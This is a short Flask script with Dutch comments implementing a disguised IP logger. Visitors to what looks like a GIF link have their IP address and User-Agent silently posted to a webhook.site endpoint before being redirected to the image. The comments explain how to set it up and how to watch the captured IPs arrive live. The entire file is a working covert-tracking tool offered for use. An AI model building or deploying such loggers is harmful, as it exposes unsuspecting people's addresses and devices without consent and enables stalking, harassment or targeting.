from flask import Flask, redirect, request
import requests

app = Flask(__name__)

# De GIF waar de persoon naartoe gaat
DESTINATION_GIF = "PLAK_HIER_JE_DIRECTE_GIF_LINK.gif"

# Jouw persoonlijke "ontvanger" (bijv. een Webhook of een simpele externe log)
# TIP: Gebruik een gratis service zoals 'webhook.site' om de IP's live binnen te zien komen.
LOG_WEBHOOK = "https://webhook.site/e30d740e-be7c-44e0-94cf-c8645e87d8ca"

@app.route('/')
def logger():
    # IP en Info verzamelen
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    
    # Stuur de info direct naar jouw webhook (zodat je niet in bestanden hoeft te zoeken)
    try:
        requests.post(LOG_WEBHOOK, json={"ip": ip, "device": user_agent})
    except:
        pass

    return redirect(DESTINATION_GIF)
